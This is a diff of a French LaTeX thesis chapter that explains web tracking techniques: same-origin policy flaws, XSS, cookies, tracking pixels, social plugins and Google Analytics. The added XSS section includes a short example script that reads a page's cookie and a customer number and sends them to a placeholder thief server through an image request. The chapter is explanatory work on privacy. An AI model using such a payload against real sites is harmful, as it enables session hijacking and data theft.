@@ -2,60 +2,75 @@
 Dans ce chapitre, nous allons nous intéresser aux techniques qui permettent de tracer les utilisateurs. Plus précisément, nous allons voir comment ces techniques utilisent ou détournent les mécanismes assurant le fonctionnement du Web.
 
 \section{Imperfections du principe de même origine}
-L'échec de l'adaptation de ce principe est une source importante de fuites de données et d'attaques. Les violations du principe de même origine peuvent être dues à un filtrage de script insuffisant du côté des applications Web du serveur ou à des défauts dans les mécanismes d'isolation des domaines au sein du navigateur \cite{Chen:2007:ABD:1315245.1315248}.
+\label{imperfections_sop}
+L'échec de la bonne adaptation de ce principe est une source importante de fuites de données et d'attaques. Les violations du principe de même origine peuvent être dues à un filtrage de script insuffisant du côté des applications Web du serveur ou à des défauts dans les mécanismes d'isolation des domaines au sein du navigateur \cite{Chen:2007:ABD:1315245.1315248}.
 
 Les défauts de filtrage des scripts au niveau des serveurs sont communément appelés failles XSS (\textit{cross-site scripting}). En exploitant ces failles, des scripts malveillants peuvent passer à travers le filtrage et être exécutés dans le même contexte de sécurité que les applications Web authentiques.
 
 Au niveau des navigateurs Web, les violations du principe de même origine sont dues à une mauvaise isolation des contenus des différents domaines. Certains domaines peuvent alors accéder aux informations appartenant à d'autres domaines alors qu'ils ne devraient pas y avoir accès.
 \newline
 
-Lorsqu'un attaquant désire compromettre une application, il est parfois plus facile d'attaquer les utilisateurs à travers leur navigateur Web que le serveur lui-même \cite{sullivan2011web}. Les navigateurs sont défendus par le principe de même origine mais la présence de failles dans le code d'un site peuvent permettre à l'attaquant de passer outre ce principe. La principale vulnérabilité des sites sont les attaques XSS. Celles-ci consistent en une vulnérabilité qui permet à un attaquant de placer son code au sein des pages d'une application Web vulnérable. Lorsqu'un visiteur visite l'une de ces pages, le code de l'attaquant est chargé avec les autres éléments de la page.
-
-La principale cause des vulnérabilités XSS vient du fait que l'application Web accepte n'importe quelles entrées des utilisateurs sans les vérifier. Cela est détectable facilement : si un utilisateur rentre une donnée contenant une portion de code dans le champ de recherche d'un site et que ce code est exécuté, le site est vulnérable aux attaques XSS. Ainsi, au moment de faire sa requête, l'utilisateur peut inclure un code inoffensif (par exemple, mettre le texte en gras) dans le champ de recherche et voir si l'affichage du site est modifié par rapport à une requête contenant uniquement du texte. Si la vulnérabilité est avérée, un attaquant pourrait très bien envoyer un code JavaScript qui va récupérer la valeur des cookies d'un utilisateur sur ce site.
-
-L'échec de l'adaptation de ce principe est une source importante de fuites de données. Il faut toutefois noter que s'il était largement appliqué, ce principe changerait énormément de fonctionnalités du Web incluant des choses simples telles que les liens hypertextes entre sites et le contenu intégré.
+Lorsqu'un attaquant désire compromettre une application, il est parfois plus facile d'attaquer les utilisateurs à travers leur navigateur Web que le serveur lui-même \cite{sullivan2011web}. Les navigateurs sont défendus par le principe de même origine mais la présence de failles dans le site Web ou dans le serveur peuvent permettre à l'attaquant de passer outre ce principe. La principale vulnérabilité des sites sont les attaques XSS. Celles-ci consistent en une vulnérabilité qui permet à un attaquant de placer son code au sein des pages d'une application Web vulnérable. Lorsqu'un visiteur se rend sur l'une de ces pages, le code de l'attaquant est chargé avec les autres éléments de la page. Ce script malicieux peut alors en être en mesure de lire le cookie de l'utilisateur ou récupérer des valeurs affichées uniquement à l'utilisateur en utilisant du JavaScript. Ensuite, une requête HTTP contenant les données volées serait utilisée afin de les envoyer au serveur de l'attaquant. Celui-ci sera ensuite capable de se faire passer pour l'utilisateur légitime sur le site ou d'utiliser les informations reçues à mauvais escient (il pourrait par exemple s'agir de données bancaires), voir \autoref{exemple_XSS}.
 \newline
 
+\begin{figure}[h]
+	\centering
+	\begin{lstlisting}
+<script>
+  // Vol du numero de client
+  var numeroDuClient = document.getElementById('numClient').innerHTML;
+  // Vol du cookie
+  var cookieDuClient = document.cookie;
+  // Requete contenant les informations volees :
+  var requete = 'http://serveur-du-voleur.be/vol?client=' + numeroDuClient + '&cookie=' + cookieDuClient;
+  // Envoi de la requete avec une image
+  document.write("<img src='" + requete + "'/>");
+</script>
+	\end{lstlisting}
+	\caption{\label{exemple_XSS}Un exemple d'attaque XSS pour voler des informations.}.
+\end{figure}
+Quand le client va se rendre sur la page, son navigateur va automatiquement faire une requête vers le serveur du voleur. Son navigateur l'avertira seulement que l'image n'a pas été trouvée mais les informations auront été néanmoins transmises au voleur. Cette attaque nécessite un minimum de préparation car le voleur doit savoir quel est le nom ou l'ID de l'élément HTML qui affiche le numéro de client (dans l'exemple, "numClient").
+Ceci est un premier exemple de violation du principe de même origine réalisé avec l'aide d'une faille XSS.
+\newline
+
+Il existe plusieurs moyens de contourner le principe de même origine. Le but de ce chapitre n'étant pas d'en faire une liste exhaustive, seuls quelques moyens seront expliqués.
 Il faut également préciser que même si le principe était correctement implémenté au sein d'un navigateur, il n'empêcherait pas les violations de vie privée face à des sites coopérants. Ceci s'explique par le fait qu'il existe une multitude de techniques simples allant des redirections jusqu'aux liens inter-sites pouvant être utilisées dans le but de transmettre des données entre des sites. Avec de tels échanges, les sites coopérants sont dans la capacité de constituer un profil inter-domaine des activités de leurs visiteurs.
-\newline
+%\newline
 
-La possibilité de violer le principe de même origine est la source de nombreuses méthodes qui permettent de tracer les utilisateurs.
-En effet, elle permet à un site A de créer et récupérer un cookie sur l'ordinateur de l'utilisateur s'il visite un autre site B qui inclut du contenu du site A (\autoref{cookies}). Cela autorise également des sites à accéder à des éléments d'un autre site enregistrés en cache (\autoref{cache}).
+%La possibilité de violer le principe de même origine est la source de nombreuses méthodes qui permettent de tracer les utilisateurs. En effet, elle permet à un site A de créer et récupérer un cookie sur l'ordinateur de l'utilisateur s'il visite un autre site B qui inclut du contenu du site A (\autoref{cookies}). Cela autorise également des sites à accéder à des éléments d'un autre site enregistrés en cache (\autoref{cache}).
 
-L'absence d'implémentation du principe de même origine dans l'historique de l'utilisateur permet de déterminer si le navigateur a été utilisé pour visiter un site en regardant la couleur des liens hypertextes pointant vers ce site. Dans ce cas, l'utilisation de cookies n'est même plus nécessaire.
-\newline
+%L'absence d'implémentation du principe de même origine dans l'historique de l'utilisateur permet de déterminer si le navigateur a été utilisé pour visiter un site en regardant la couleur des liens hypertextes pointant vers ce site. Dans ce cas, l'utilisation de cookies n'est même plus nécessaire.
+%\newline
 
-Le traçage des utilisateurs peut être classé en plusieurs catégories \cite{Jackson:2006:PBS:1135777.1135884} :
-\begin{itemize}
-  \item tracking sur une seule session : inévitable vu comment le Web fonctionne
-  \item tracking sur de multiples sessions : permet à un site d'identifier un visiteur s'il revient plus tard sur le site
-  \item tracking coopératif : permet à des sites coopérants de créer un historique des visites d'un utilisateur sur tous les sites de la coopération
-  \item tracking semi-coopératif sur un seul site : permet à un site de déterminer des informations sur les activités d'un visiteur sur un autre site en y plaçant du contenu (par exemple, en plaçant une image sur un forum)
-  \item tracking semi-coopératif sur de multiples sites : identique au tracking semi-coopératif sur un seul site à l'exception qu'il peut y avoir plusieurs sites ciblés
-  \item tracking non coopératif : permet à un site de déterminer des informations sur les activités d'un visiteur sur un autre site sans participation du site ciblé
-  \newline
-\end{itemize}
-
-Certains types de tracking peuvent être évités en améliorant le principe de même origine mais il est malheureusement difficile de contrer les types de tracking dits coopératifs.
+%Le traçage des utilisateurs peut être classé en plusieurs catégories \cite{Jackson:2006:PBS:1135777.1135884} :
+%\begin{itemize}
+%  \item tracking sur une seule session : inévitable vu comment le Web fonctionne
+%  \item tracking sur de multiples sessions : permet à un site d'identifier un visiteur s'il revient plus tard sur le site
+%  \item tracking coopératif : permet à des sites coopérants de créer un historique des visites d'un utilisateur sur tous les sites de la coopération
+%  \item tracking semi-coopératif sur un seul site : permet à un site de déterminer des informations sur les activités d'un visiteur sur un autre site en y plaçant du contenu (par exemple, en plaçant une image sur un forum)
+%  \item tracking semi-coopératif sur de multiples sites : identique au tracking semi-coopératif sur un seul site à l'exception qu'il peut y avoir plusieurs sites ciblés
+%  \item tracking non coopératif : permet à un site de déterminer des informations sur les activités d'un visiteur sur un autre site sans participation du site ciblé
+%  \newline
+%\end{itemize}
+%
+%Certains types de tracking peuvent être évités en améliorant le principe de même origine mais il est malheureusement difficile de contrer les types de tracking dits coopératifs.
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{Cookies}
 \label{cookies}
-En ce qui concerne les cookies, il est assez simple de tracer la navigation d'un utilisateur. En effet, nous avons vu que le navigateur envoie dans chaque requête HTTP un en-tête \textit{Cookie}. Il est donc aisé pour le site web de suivre le parcours du visiteur simplement en analysant cet en-tête. Le fait de passer par un proxy ne change rien car le cookie reste indépendant du moyen d'accès au site web.
-\newline
-
 En général, on utilise deux types de classification pour les cookies \cite{Yue:2007:ACU:1251984.1253093}.
 
-Le premier se base sur l'origine et la destination : les cookies sont classifiés en tant que cookies "first-party" ou "third-party". Les cookies "first-party" sont issus du domaine que l'utilisateur est en train de visiter, on les appelle cookies d'origine ou cookies de domaine. Les cookies "third-party" sont créés par un site autre que celui qui est visité par l'utilisateur, on les appelle cookies tiers.
+Le premier se base sur l'origine et la destination : les cookies sont classifiés en tant que cookies "first-party" ou "third-party". Les cookies "first-party" sont issus du domaine que l'utilisateur est en train de visiter, on les appelle cookies d'origine ou cookies de domaine. Les cookies "third-party" sont créés par un site autre que celui qui est visité par l'utilisateur, on les appelle cookies tiers.\\
+Les cookies tiers sont placés suite à des réponses HTTP venant de sites tiers. Un site \textit{alpha.com} ne peut pas créer de cookie au nom du site \textit{beta.com} (voir RFC 6265 \cite{IETF_RFC6265}, section 4.1.2.3), cela provoquerait des problèmes de sécurité évidents. Pour les mêmes raisons, les cookies ayant un suffixe public \footnote{Un suffixe public est un domaine qui est contrôlé par un registre public comme "com", "co.uk" ou "pvt.k12.wy.us" \cite{IETF_RFC6265}. Une liste est maintenue par le projet Mozilla : \url{http://publicsuffix.org/}.} dans l'attribut \textit{Domain} sont rejetés.
 
 La seconde méthode de classification se base sur la durée de vie du cookie : les cookies sont alors classifiés en cookies de session ou cookies persistants. Les cookies de session sont stockés dans la mémoire vive de l'ordinateur et supprimés à la fermeture du navigateur. A l'opposé, les cookies persistants sont stockés sur le disque dur de l'ordinateur et supprimés soit lors de leur expiration, soit manuellement par l'utilisateur.
 \newline
 
 Les cookies tiers, qu'ils soient de session ou persistants, n'apportent quasiment aucun bénéfice à l'utilisateur. Ils sont d'ailleurs reconnus comme une menace pour la vie privée et les navigateurs proposent généralement une option pour les désactiver.
 
-Les cookies d'origine de type session ne posent pas vraiment de problèmes relatifs à la vie privée étant donné leur faible durée de vie.
+Les cookies d'origine de type session ne posent généralement pas vraiment de problèmes relatifs à la vie privée étant donné leur faible durée de vie. En théorie, ceci est valable car l'utilisateur ferme les fenêtres de son navigateur régulièrement. Par contre, un utilisateur qui laisse constamment l'onglet d'un site ouvert pourrait se faire tracer par le site en question.
 
-A l'opposé, les cookies d'origine persistants peuvent poser des problèmes divers. En effet, les cookies persistants sont une arme à double tranchant : ils peuvent jouer un rôle utile en permettant la personnalisation et l'authentification sur les sites mais ils peuvent également jouer un rôle plus dangereux qui amène des risques au niveau de la vie privée et de la sécurité. Ces risques reposent sur deux aspects : le premier, et celui qui nous intéresse principalement ici, est que les cookies persistants permettent de tracer l'activité de l'utilisateur. Le deuxième risque est qu'ils peuvent être volés ou manipulés par des attaques de deux types : les attaques XSS (elles exploitent les vulnérabilités des applications Web) et les attaques qui exploitent les vulnérabilités des navigateurs Web (via notamment le contournement du principe de même origine).
+A l'opposé, les cookies d'origine persistants peuvent poser des problèmes divers. En effet, les cookies persistants sont une arme à double tranchant : ils peuvent jouer un rôle utile en permettant la personnalisation et l'authentification sur les sites mais ils peuvent également jouer un rôle plus dangereux qui amène des risques au niveau de la vie privée et de la sécurité. Ces risques reposent sur deux aspects : le premier, et celui qui nous intéresse principalement ici, est que les cookies persistants permettent de tracer l'activité de l'utilisateur dans le temps. En effet, pour chaque page visitée, le client envoie une requête au serveur, celui-ci est donc capable de suivre l'utilisateur lors de la visite du site. Le deuxième risque est que les cookies persistants peuvent être volés ou manipulés par des attaques de deux types : les attaques XSS (elles exploitent les vulnérabilités des applications Web, voir la \autoref{exemple_XSS} de la \autoref{imperfections_sop}) et les attaques qui exploitent les vulnérabilités des navigateurs Web (via notamment le contournement du principe de même origine).
 \newline
 
 Une étude menée sur plus de 5000 sites à propos de l'utilisation des cookies \cite{Yue:2007:ACU:1251984.1253093} a montré que les cookies d'origine persistants sont largement utilisés et que plus de 60\% sont réglés pour expirer plus d'un an après leur création.
@@ -105,7 +120,7 @@ Plus le serveur est situé à une grande distance, plus la requête DNS prend de
 Cette attaque peut être menée dans différentes situations :
 \begin{itemize}
   \item Un site web qui veut en savoir davantage sur ses visiteurs.
-  \item Une régie publicitaire pourrait inclure le code de mesure dans les bannières qu'elle distribue afin de faire des statistiques sur les sites web consultés par les visiteurs.\\Il est même possible de distribuer un code différent pour les catégoriser.
+  \item Une régie publicitaire pourrait inclure le code de mesure dans les bannières qu'elle distribue afin de faire des statistiques sur les sites web consultés par les visiteurs.\\Il est même possible de distribuer un code différent pour les catégoriser.\\Bien entendu, cette attaque résulte d'une collaboration entre le site et la régie publicitaire.
   \item L'attaquant pourrait créer un site web de telle façon à ce qu'il apparaisse en tête des moteurs de recherche dans le but de faire des statistiques sur les personnes intéressées par un sujet particulier. Il faut noter que cette situation reste théorique et a peu de chances de fonctionner.
   \item L'attaquant pourrait envoyer un mail contenant le code HTML à sa victime.\\En le faisant ressembler à du spam, la victime ne remarquerait rien d'anormal et la mesure serait effectuée.
 \end{itemize}
@@ -144,7 +159,12 @@ D'après les chercheurs, le tracking via l'entête ETag et le fait de pouvoir r�
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{Pixels espions}
-Les pixels espions sont des images de taille minime (généralement, de 1 pixel de haut sur 1 pixel de large) et sont destinés à effectuer une requête HTTP vers un serveur sans que le visiteur de la page ne s'en aperçoive. L'administrateur du site hébergeant ce pixel espion peut dès lors analyser les logs de son serveur Web afin d'obtenir des informations sur l'utilisateur. En plaçant un pixel espion spécifique sur chaque site, l'administrateur peut distinguer sans problème les requêtes provenant des différents sites et ainsi déterminer quel site a été visité par chaque utilisateur. De plus, en analysant la requête, il peut connaître l'heure à laquelle le visiteur s'est rendu sur la page mais également d'autres informations telles que le navigateur utilisé, le système d'exploitation, etc.
+Les pixels espions sont des images de taille minime (généralement, de 1 pixel de haut sur 1 pixel de large) et sont destinés à effectuer une requête HTTP vers un serveur sans que le visiteur de la page ne s'en aperçoive. L'administrateur du site hébergeant ce pixel espion peut dès lors analyser les logs de son serveur Web afin d'obtenir des informations sur l'utilisateur. En plaçant un pixel espion spécifique sur chaque site, il est possible de distinguer sans problème les requêtes provenant des différents sites et ainsi déterminer quel site a été visité par chaque utilisateur.
+En analysant la requête envoyée par le client, le serveur peut connaître plusieurs informations : la date et l'heure à laquelle le visiteur s'est rendu sur la page, son "User-Agent" (le navigateur utilisé, sa version, le système d'exploitation...), la langue, les cookies et toutes les informations disponibles par défaut dans une requête HTTP.\\
+De plus, l'URI présente dans celle-ci peut contenir des informations additionnelles placées dans la requête de l'URI (après le point d'interrogation), voir la \autoref{exemple_XSS}.
+\newline
+
+Les pixels espions sont généralement utilisés pour tracker les visites. Par exemple, un site commercial pourrait placer un pixel de tracking sur sa page de confirmation d'achat. Cela enverrait alors une requête vers un serveur qui analyse les requêtes reçues et le parcours de l'acheteur pourrait être retracé avec l'information contenue dans le cookie. Par exemple, un cookie pourrait contenir le nom de la campagne de publicité qui a amené le visiteur sur le site. Les statistiques reçues permettraient alors au site de déterminer quelle campagne marketing a le mieux fonctionné.
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \section{JavaScript}
@@ -154,17 +174,66 @@ JavaScript permet d'exécuter des scripts du côté client. Il a entraîné le d
 \begin{itemize}
 	\item Le vol de cookies : le script inclus depuis un site tiers a accès à toutes les informations présentes sur la page. Lorsque celle-ci fait appel à un script, elle lui donne accès aux cookies, à la barre d'adresses et à l'ensemble des éléments disponibles sur la page. Le script a donc la capacité de lire le contenu des cookies associés au site et de l'envoyer à un site tiers (une régie publicitaire par exemple).
 	\item Le détournement d'adresse : le script, ayant l'accès complet au contenu de la page, peut influencer les valeurs des URL. Le script peut également rediriger le navigateur vers un autre site et le rediriger ensuite vers le site d'origine sans que l'utilisateur ne s'en aperçoive (au chargement de la page par exemple).
-	\item L'analyse de l'historique : l'attaque consiste à regarder comment les liens sont affichés par le navigateur. En effet, s'ils ont été visités, les liens s'affichent d'une autre couleur. Il suffit alors de créer un lien vers le site que l'on désire cibler dans une partie invisible de la page et utiliser l'interface DOM du navigateur pour regarder comment celui-ci affiche le lien. Cette attaque est possible car dans la plupart des navigateurs, l'accès à un historique de pages visitées, de fichiers cachés et de cache DNS est partagé entre les domaines.
+	\item L'analyse de l'historique : l'attaque consiste à regarder comment les liens sont affichés par le navigateur. En effet, s'ils ont été visités, les liens s'affichent d'une autre couleur. Avec JavaScript, il suffit alors de créer un lien vers le site que l'on désire cibler dans une partie invisible de la page et utiliser l'interface DOM du navigateur pour regarder comment celui-ci affiche le lien. Cette attaque est possible car dans la plupart des navigateurs, l'accès à un historique de pages visitées, de fichiers cachés et de cache DNS est partagé entre les domaines. Cependant, ces éléments ne sont pas accessibles simplement : par exemple, il est nécessaire de placer un lien vers un site pour accéder à l'information concernant ce site et pouvoir déterminer s'il a été visité grâce à la couleur du lien affiché.
 	\item Le traçage de comportement : il est possible de déterminer avec précision le comportement de l'utilisateur sur la page qu'il visite. L'élaboration d'une ligne du temps avec les interactions de l'utilisateur (clics, mouvements, défilements, parties de texte surlignées,...) est réalisable avec l'aide de gestionnaires d'événements. Cet ensemble d'interactions peut alors être envoyé à un site tiers afin de calculer des statistiques sur la navigation de l'utilisateur.
+	\newline
 \end{itemize}
 
+Lorsque du code JavaScript est inclus dans une page, il n'est pas soumis au principe de même origine (\autoref{sop}). Ce script a donc accès à l'ensemble des éléments de la page et pourrait potentiellement récupérer des données, voir \autoref{inclusion_js}. \cite{sullivan2011web}.
+\begin{figure}[h]
+	\centering
+	\begin{lstlisting}
+<script src="http://exemple.com/script.js />
+	\end{lstlisting}
+	\caption{\label{inclusion_js}Inclusion d'un code JavaScript dans une page.}.
+\end{figure}
+
+Une propriété de JavaScript mérite aussi notre attention, il s'agit de \textit{document.domain}. Cette propriété permet à deux sites ayant le même domaine de plus haut niveau de s'accorder sur le fait qu'ils veulent être considérés équivalents. Par exemple, afin de pouvoir s'échanger des données, deux sites \textit{login.exemple.com} et \textit{paiements.exemple.com} pourraient passer outre la vérification habituelle du domaine (les protocoles et les ports doivent correspondre), voir \autoref{js_document_domain}.
+\begin{figure}[h]
+	\centering
+	\begin{lstlisting}
+document.domain = "exemple.com"
+	\end{lstlisting}
+	\caption{\label{js_document_domain}Modification du domaine de la page avec JavaScript.}.
+\end{figure}
+
 \subsection{Régies publicitaires sur Internet}
+Il semble logique que les régies publicitaires se soient intéressées au tracking des utilisateurs. Grâce à lui, elles sont en mesure de calculer des statistiques diverses sur les intérêts des utilisateurs, ceci ayant pour but de les inciter à consommer davantage en leur proposant par exemple des produits qui ont plus de chances de les intéresser. Le tracking leur permet également de calculer les montants que leurs clients vont payer (pour ceux qui affichent les publicités de leurs produits) ou recevoir (pour ceux qui affichent de la publicité sur leur site). Ainsi, Google possède 2 services : \textit{Google Adsense} qui utilise les contenus des utilisateurs (sites Web, vidéos YouTube,...) comme support d'affichage pour les publicités et \textit{Google Adwords} qui propose à des annonceurs de diffuser leurs publicités.
+\newline
+
+Les techniques utilisées par les régies publicitaires sont globalement les mêmes que pour les autres entreprises : il faut inclure un code JavaScript qui va s'occuper de faire le tracking des utilisateurs et ce code contient généralement l'identifiant du client de la régie publicitaire. Il faut noter que les régies publicitaires sont parfois prêtes à aller loin pour s'assurer du suivi des utilisateurs. C'est pourquoi certaines n'hésitent pas à user de techniques malicieuses pour recréer des cookies HTTP effacés grâce à Flash ou au stockage local HTML5 (voir les sections correspondantes).
+\newline
+
+La publicité sur Internet constitue un important modèle économique qui supporte l'accès gratuit à une majorité de contenus. Afin de pouvoir gagner un profit, les éditeurs placent des publicités sur leur site et se font payer par des publicitaires ou réseaux publicitaires. Vu la popularité du Web aujourd'hui, ces derniers veulent que leurs techniques soient de plus en plus sophistiquées. Au lieu d'afficher la même publicité chez tous les utilisateurs, ils souhaitent que leurs publicités soient personnalisées. Afin de parvenir à faire de la publicité ciblée, ils doivent être en mesure de déterminer le profil de chacun et c'est pour cela que le traçage des utilisateurs semble s'intensifier avec le temps.
 
 \subsection{Modules des réseaux sociaux}
-Les réseaux sociaux proposent généralement de placer un plugin social qui permet aux visiteurs d'un site d'interagir et de partager avec leurs amis. Bien sûr, l'intégration d'un tel script permet aux plateformes de réseaux sociaux de suivre la navigation des visiteurs d'un site. Si beaucoup de sites intègrent ces scripts, les réseaux sociaux sont alors en mesure d'obtenir une sorte de carte d'Internet avec les déplacements et actions de chaque utilisateur. De plus, si un visiteur est connecté à son compte sur un réseau social en naviguant sur d'autres sites, la plateforme peut directement faire le lien entre son profil et les sites qu'il visite.
+Les réseaux sociaux proposent généralement de placer un module social qui permet aux visiteurs d'un site d'interagir et de partager avec leurs amis. Bien sûr, l'intégration d'un tel script permet aux plateformes de réseaux sociaux de suivre la navigation des visiteurs d'un site. Si beaucoup de sites intègrent ces scripts, les réseaux sociaux sont alors en mesure d'obtenir une sorte de carte d'Internet avec les déplacements et actions de chaque utilisateur. En effet, à chaque page contenant un module social affichée, une requête est effectuée vers le serveur du réseau social donc celui peut le suivre. De plus, si le visiteur est connecté à son compte sur le réseau social en naviguant sur d'autres sites, la plateforme peut directement faire le lien entre son profil et les sites qu'il visite.
+\newline
+
+Les principaux réseaux sociaux proposent généralement les mêmes fonctionnalités. Celles-ci sont également disponibles sur différents systèmes d'exploitation tels qu'Android ou iOS.
+
+\begin{figure}[h]
+	\centering
+	\includegraphics[scale=0.55]{figures/modules_sociaux_lesoir.png}
+	\caption{\label{etag}Partage via les modules des réseaux sociaux sur \textit{lesoir.be}.}
+\end{figure}
+
+\begin{figure}[h]
+	\centering
+	\includegraphics[scale=0.55]{figures/module_facebook_lalibre.png}
+	\caption{\label{etag}Module de commentaires via Facebook sur \textit{lalibre.be}.}
+\end{figure}
+
+\begin{figure}[h]
+	\centering
+	\includegraphics[scale=0.55]{figures/module_facebook_lesoir.png}
+	\caption{\label{etag}Module incitant le visiteur à lier son compte Facebook au site \textit{lesoir.be}.}
+\end{figure}
 
 \subsubsection{Facebook}
-Le code que les gestionnaires de sites Web doivent intégrer au sein de leur page afin d'accéder aux fonctionnalités offertes par Facebook \cite{javascript_facebook_sdk} est visible à la \autoref{js_facebook_sdk}.
+Le code que les gestionnaires de sites Web doivent intégrer au sein de leur page afin d'accéder aux fonctionnalités offertes par Facebook \cite{javascript_facebook_sdk} est visible à la \autoref{js_facebook_sdk}. L'intégration de ce code permet aux sites Web d'utiliser entre autres les plugins suivants : le bouton "Like", le bouton de partage, le flux d'actualités d'une page Facebook et le module de commentaires.
+
+Facebook propose également un SDK pour PHP et donne une liste de SDK, plugins et outils développés par d'autres. Les possibilités offertes par Facebook sont nombreuses, elles vont du module d'identification au module de paiements en passant par la publicité. Tout est bien détaillé sur un portail destiné aux développeurs \footnote{\url{https://developers.facebook.com/docs/}}.
 
 \begin{figure}[h]
 	\centering
@@ -173,7 +242,7 @@ Le code que les gestionnaires de sites Web doivent intégrer au sein de leur pag
 \end{figure}
 
 \subsubsection{Google+}
-De son côté, Google propose différents scripts à ajouter en fonction des fonctionnalités que le gestionnaire de site Web veut intégrer au sein de sa page (voir \autoref{js_google_plus}). Google propose même de charger de façon asynchrone son script afin d'obtenir des performances optimales (voir \autoref{js_google_plus_async}) \cite{javascript_google_plus}.
+De son côté, Google propose différents scripts à ajouter en fonction des fonctionnalités que le gestionnaire de site Web veut intégrer au sein de sa page (voir \autoref{js_google_plus}). Google propose même de charger de façon asynchrone son script afin d'obtenir des performances optimales (voir \autoref{js_google_plus_async}) \cite{javascript_google_plus}. Google+ propose le même genre de plugins \footnote{\url{https://developers.google.com/+/}} que Facebook tels que l'installation d'un module d'identification par compte Google, des boutons de partage, de recommandations, de suivi et autres.
 
 \begin{figure}[h]
 	\centering
@@ -188,27 +257,45 @@ De son côté, Google propose différents scripts à ajouter en fonction des fon
 \end{figure}
 
 \subsubsection{LinkedIn}
-LinkedIn propose également une API pour connecter les sites avec sa plateforme \cite{javascript_linkedin}. Dans la \autoref{js_linkedin}, on peut même voir que le nom de l'utilisateur (s'il est connecté sur la plateforme) est affiché sur le site. Cet aspect semblera convivial à la majorité des utilisateurs mais cela permet surtout de mieux les suivre lors de leur navigation sur les sites intégrant ce module social.
+LinkedIn propose également une API pour connecter les sites avec sa plateforme \cite{javascript_linkedin}. Dans la \autoref{js_linkedin}, on peut même voir que le nom de l'utilisateur (s'il est connecté sur la plateforme) est affiché sur le site. Cet aspect semblera convivial à la majorité des utilisateurs mais cela permet surtout de mieux les suivre lors de leur navigation sur les sites intégrant ce module social. Cette fonctionnalité est d'ailleurs également proposée par les autres plateformes de réseaux sociaux.
 
-\begin{figure}[h]
+\begin{figure}[!h]
 	\centering
 	\lstinputlisting{examples/js_linkedin}
 	\caption{\label{js_linkedin}L'API JavaScript de \textit{LinkedIn}}.
 \end{figure}
 
 \subsection{Outils destinés aux webmasters}
-Certaines plateformes proposent aux gestionnaires de sites Web de suivre la navigation des visiteurs sur leur site. Elles regardent d'où viennent les visites (moteur de recherche, accès direct, lien d'un autre site,...), leur navigateur (la version, les plugins installés, la langue,...), sur quels pages les visiteurs se rendent, combien de temps ils restent sur chaque page, etc.
+Certaines plateformes proposent aux gestionnaires de sites Web de suivre la navigation des visiteurs sur leur site. Elles regardent d'où viennent les visites (moteur de recherche, accès direct, lien d'un autre site,...), leur navigateur (la version, les extensions installées, la langue,...), sur quels pages les visiteurs se rendent, combien de temps ils restent sur chaque page, etc.
 
 \subsubsection{Google Analytics (Universal Analytics)}
 \label{google_analytics}
 Une des principales plateformes de suivi des utilisateurs est Google Analytics. Cet outil est utilisé par de nombreux gestionnaires de sites afin de connaître les statistiques de fréquentation de leur site \cite{javascript_google_analytics}.
 
+\begin{figure}[!h]
+	\centering
+	\lstinputlisting{examples/js_google_analytics}
+	\caption{\label{js_google_analytics}L'API JavaScript de \textit{Google Analytics}}.
+\end{figure}
+
 Comme on peut le voir sur la \autoref{Google_Analytics_1}, les statistiques sont très détaillées. Dans la \autoref{Google_Analytics_2}, la ville des visiteurs était affichée mais il est également possible de voir d'autres données telles que leur FAI ou leur système d'exploitation. Des données spécifiques aux clients mobiles sont également disponibles. Toutes les données sont affichées dans des graphiques clairs et dynamiques et il est même possible d'exporter l'ensemble de ces données dans différents formats (CSV, TSV, Excel, PDF,...) afin de les traiter de manière automatique.
 \newline
 
+\begin{figure}[!h]
+	\centering
+	\includegraphics[scale=0.35]{examples/Google_Analytics_1.png}
+	\caption{\label{Google_Analytics_1}Copie d'écran de \textit{Google Analytics} qui détaille les visites}
+\end{figure}
+
+\begin{figure}[!h]
+	\centering
+	\includegraphics[scale=0.35]{examples/Google_Analytics_2.png}
+	\caption{\label{Google_Analytics_2}Copie d'écran de \textit{Google Analytics} qui détaille l'origine des visiteurs}
+\end{figure}
+
 Google a développé une nouvelle version de son outil d'analyse des visiteurs : Universal Analytics. Ce nouvel outil repose sur le même socle que Google Analytics mais il apporte de nouvelles fonctionnalités.
 
-Pour ce nouvel outil, Google propose 3 types de code de tracking en fonction des plateformes visées : la librairie JavaScript \textit{analytics.js} pour les sites Web, les SDK Google Analytics pour les applications mobiles et le \textit{protocole de mesure ("Measurement Protocol")} pour les autres appareils tels que consoles de jeux et les kiosques d'information.
+Pour ce nouvel outil, Google propose 3 types de code de tracking en fonction des plateformes visées : la librairie JavaScript \textit{analytics.js} pour les sites Web, les SDK Google Analytics pour les applications mobiles et le \textit{protocole de mesure ("Measurement Protocol")} pour les autres appareils tels que consoles de jeux.% et les kiosques d'information.
 \newline
 
 Alors que Google Analytics identifiait un utilisateur différent en fonction de chaque appareil connecté, Universal Analytics reconnaît un même utilisateur qui utilise plusieurs moyens de se connecter à Internet. Afin d'y parvenir, ils utilisent un identifiant d'utilisateur unique afin d'associer les données reçues d'appareils et de sessions différentes.
@@ -246,25 +333,10 @@ Les cookies créés sont:
   \item[$\bullet$] \textbf{\_\_utmc} : cookie avec une date d'expiration de fin de session qui n'est plus utilisé dans \textit{ga.js} mais qui permet l'interopérabilité avec \textit{urchin.js} (une librairie encore plus ancienne de Google Analytics, antérieure à \textit{ga.js}).
   \item[$\bullet$] \textbf{\_\_utmz} : cookie avec une date d'expiration de 6 mois destiné à enregistrer les sources de trafic ou de campagne qui explique comment un utilisateur atteint le site.
   \item[$\bullet$] \textbf{\_\_utmv} : cookie avec une date d'expiration de 2 ans utilisé pour sauvegarder les données des variables personnalisées au niveau de l'utilisateur.
+  \newline
 \end{itemize}
 
-\begin{figure}[h]
-	\centering
-	\lstinputlisting{examples/js_google_analytics}
-	\caption{\label{js_google_analytics}L'API JavaScript de \textit{Google Analytics}}.
-\end{figure}
-
-\begin{figure}[h]
-	\centering
-	\includegraphics[scale=0.4]{examples/Google_Analytics_1.png}
-	\caption{\label{Google_Analytics_1}Copie d'écran de \textit{Google Analytics} qui détaille la navigation sur le site}
-\end{figure}
-
-\begin{figure}[h]
-	\centering
-	\includegraphics[scale=0.4]{examples/Google_Analytics_2.png}
-	\caption{\label{Google_Analytics_2}Copie d'écran de \textit{Google Analytics} qui détaille l'origine des visiteurs}
-\end{figure}
